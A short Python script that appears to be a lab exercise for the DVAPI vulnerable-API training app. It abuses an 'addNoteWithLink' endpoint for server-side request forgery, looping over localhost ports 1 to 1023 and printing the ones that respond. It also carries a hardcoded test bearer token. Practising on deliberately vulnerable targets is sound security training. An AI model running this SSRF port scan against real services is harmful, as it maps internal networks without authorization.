import requests

# TODO: Add correct authenticaiton header 
http_headers = {
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2N2NmZTJiNDJlYTc4MTM1Mjk2MzFiZmQiLCJ1c2VybmFtZSI6InRlc3QiLCJpc0FkbWluIjoiZmFsc2UiLCJpYXQiOjE3NDE2Nzc4NjJ9.B-BqiQ7T_UJXzPsraRCPhfHa0HvDx9xJ-oqAHq_ChfI',
}


for port in range(1,1024):

    # TODO: Fix this dictionary to match the request made by the Web Application
    json_data = {
        'url': f'http://localhost:{port}',
    }
    
    
    # TODO: Use the correct DVAPI endpoint
    url_dvapi = "http://localhost:3000/api/addNoteWithLink"
    response = requests.post(
        url_dvapi,
        headers=http_headers,
        json=json_data,
    )

    if "error" not in response.text:
        print(port)
        print(response.text)